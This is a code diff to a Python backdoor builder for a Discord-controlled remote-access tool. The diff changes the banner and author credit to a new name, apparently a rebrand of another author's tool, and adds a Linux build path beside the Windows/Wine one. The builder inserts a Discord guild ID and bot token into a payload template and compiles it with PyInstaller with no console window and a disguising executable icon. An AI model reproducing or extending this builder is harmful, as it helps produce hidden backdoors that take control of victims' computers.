@@ -13,19 +13,16 @@ def clear_screen():
 
 def print_banner():
     print(r'''
-▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
-▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
-░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
-░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
-░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
- ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
- ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
- ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
-   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
- ░                   ░                                                 
 
-Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis
-
+██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗   ██╗
+██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝
+██████╔╝███████║ ╚████╔╝ ██████╔╝███████║ ╚████╔╝ 
+██╔══██╗██╔══██║  ╚██╔╝  ██╔══██╗██╔══██║  ╚██╔╝  
+██████╔╝██║  ██║   ██║   ██████╔╝██║  ██║   ██║   
+╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
+                                                v2.0.1
+          
+Made by vicky aka admin12121 | Github : admin12121
 Run 'help use' to get started!
 ''')
 
@@ -61,8 +58,18 @@ def get_pyinstaller_path():
 
 def build_backdoor(payload, settings):
     if payload == "discord":
+        # Prompt for platform
+        platform_choice = input("Build for which platform? (windows/linux) [windows]: ").strip().lower()
+        if platform_choice not in ["linux", "windows", ""]:
+            print("[!] Invalid platform. Choose 'windows' or 'linux'.")
+            return
+        if platform_choice == "linux":
+            template_path = "code/discord_linux.py"
+        else:
+            template_path = "code/discord/main.py"
+
         try:
-            with open("code/discord/main.py", 'r') as f:
+            with open(template_path, 'r') as f:
                 file = f.read()
             newfile = file.replace("{GUILD}", str(settings[1]))
             newfile = newfile.replace("{TOKEN}", str(settings[2]))
@@ -76,14 +83,21 @@ def build_backdoor(payload, settings):
         with open(filename, 'w') as f:
             f.write(newfile)
 
-        pyinstaller_path = get_pyinstaller_path()
-        if not pyinstaller_path:
-            print("[!] PyInstaller not found in Wine prefix. Please ensure Python and PyInstaller are installed under Wine.")
-            return
+        if platform_choice == "linux":
+            # Build for Linux (no Wine, no Windows icon)
+            compile_command = [
+                "python3", "-m", "PyInstaller", "--onefile", "--noconsole", filename
+            ]
+        else:
+            # Build for Windows (Wine + icon)
+            pyinstaller_path = get_pyinstaller_path()
+            if not pyinstaller_path:
+                print("[!] PyInstaller not found in Wine prefix. Please ensure Python and PyInstaller are installed under Wine.")
+                return
+            compile_command = [
+                "wine", pyinstaller_path, "--onefile", "--noconsole", "--icon=img/exe_file.ico", filename
+            ]
 
-        compile_command = [
-            "wine", pyinstaller_path, "--onefile", "--noconsole", "--icon=img/exe_file.ico", filename
-        ]
         subprocess.call(compile_command)
         for ext in [".py", ".spec"]:
             try:
